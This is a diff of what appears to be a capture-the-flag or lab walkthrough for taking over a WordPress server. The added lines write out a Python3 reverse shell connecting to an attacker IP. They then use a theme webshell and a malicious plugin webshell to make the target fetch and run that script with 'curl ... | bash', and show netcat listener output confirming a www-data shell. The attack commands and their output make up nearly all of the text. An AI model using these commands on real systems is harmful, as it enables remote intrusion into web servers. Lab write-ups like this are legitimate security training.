@@ -111,20 +111,35 @@ curl -sk "http://10.49.131.138/wordpress/wp-content/themes/twentytwenty/404.php?
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Start a listener on port 8080 (ports 4444, 443, 9001 are blocked):
+Ports 4444, 443, and 9001 are blocked — use port 8080. Write the reverse shell to a file and serve it over HTTP:
+
+```bash
+cat > shell.sh <<'EOF'
+python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.240.231',8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
+EOF
+python3 -m http.server 9090
+```
+
+Open a second terminal and start the listener:
 
 ```bash
 nc -nlvp 8080
 ```
 
-Deliver a Python3 reverse shell via the webshell:
+Use the webshell to make the target fetch and execute the shell:
 
 ```bash
-# URL-encode the payload and deliver via curl
-curl -sk "http://10.49.131.138/wordpress/wp-content/themes/twentytwenty/404.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.x.x.x\",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
+curl -sk "http://10.49.131.138/wordpress/wp-content/themes/twentytwenty/404.php?cmd=curl+http://192.168.240.231:9090/shell.sh|bash"
 ```
 
-Shell lands as `www-data`.
+Shell lands:
+
+```
+listening on [any] 8080 ...
+connect to [192.168.240.231] from (UNKNOWN) [10.49.131.138] 54312
+www-data@ip-10-49-131-138:/var/www/html/wordpress/wp-content/themes/twentytwenty$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
 ### Method B — Malicious Plugin Upload
 
@@ -168,7 +183,20 @@ EOF
 zip -r malicious.zip malicious/
 ```
 
-Use the same `nc` listener and Python3 reverse shell payload as in Method A to get a `www-data` shell.
+With the `nc` listener running on port 8080 and `shell.sh` served on port 9090 (same setup as Method A), trigger the shell via the plugin webshell:
+
+```bash
+curl -sk "http://10.49.131.138/wordpress/wp-content/plugins/malicious/webshell.php?cmd=curl+http://192.168.240.231:9090/shell.sh|bash"
+```
+
+Shell lands:
+
+```
+listening on [any] 8080 ...
+connect to [192.168.240.231] from (UNKNOWN) [10.49.131.138] 54318
+www-data@ip-10-49-131-138:/var/www/html/wordpress/wp-content/plugins/malicious$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
 ---
 
